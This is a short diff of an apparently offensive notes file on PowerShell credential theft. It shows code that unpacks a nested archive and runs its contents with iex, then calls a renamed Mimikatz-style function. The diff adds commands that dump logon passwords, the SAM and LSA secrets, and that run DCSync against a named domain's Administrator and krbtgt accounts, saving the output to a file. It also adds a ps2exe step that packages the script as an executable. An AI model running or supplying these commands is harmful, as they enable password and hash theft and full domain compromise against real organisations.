@@ -48,13 +48,14 @@ $file =$archivesLevel4.Entries[0].Open()
 $reader = New-Object IO.StreamReader($file)
 $text = $reader.ReadToEnd()
 iex $text
-Hartford -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"' > take.txt
+Hartford -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" "lsadump::dcsync"  "lsadump::dcsync /domain:ksew.com.pk /user:Administrator" "lsadump::dcsync /user:ksew.com.pk\krbtgt" "exit"' > take.txt
 ```
 
 
 
 # converting powershell to exe
 
+`Install-Module -Name ps2exe -RequiredVersion 1.0.10`
 `Invoke-ps2exe .\unkitikat.ps1 .\bang.exe`
 
 
